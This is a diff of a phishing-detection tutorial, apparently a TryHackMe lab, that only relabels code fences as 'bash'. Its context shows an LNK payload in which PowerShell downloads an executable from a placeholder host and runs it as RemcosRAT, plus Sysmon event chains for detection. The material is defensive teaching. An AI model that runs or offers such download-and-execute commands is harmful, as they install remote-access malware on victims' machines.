@@ -177,7 +177,7 @@ Current State of Phishing Phishing attacks are still a major threat as they can'
     Threat actors can include any command inside the LNK "Target" field, as well as set any shortcut icon. You can verify it by right-clicking the LNK file, selecting "Properties", and viewing the "Shortcut" tab. The case shown above, for example, downloads and executes a simplified version of RemcosRAT - malware used in many attacks on major companies and government agencies. The terminal below shows a full LNK payload:
 
    LNK Download -> PowerShell -> RemcosRAT 
-```LNK Download -> PowerShell -> RemcosRAT 
+```bash
 powershell.exe -c ...
 # Download the encoded malware
 (New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
@@ -215,7 +215,7 @@ start C:\\ProgramData\\r.exe;
 Detecting Malicious Download It is relatively simple to hunt for malicious downloads if you know how the victim sees it. First, the user uses a web browser or desktop application to open a phishing attachment. In the simplest case, it would be a direct .exe malware download, but you are far more likely to see an archive attachment like .zip or .rar containing the malware. In this case, Sysmon can greatly help you detect every attack stage:
 
    Sysmon Event Chain for Double-Extension Attachment 
-```Sysmon Event Chain for Double-Extension Attachment 
+```bash
 # 1. Sysmon Event ID 1: Web browser is launched
 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
 ParentImage: C:\Windows\Explorer.EXE
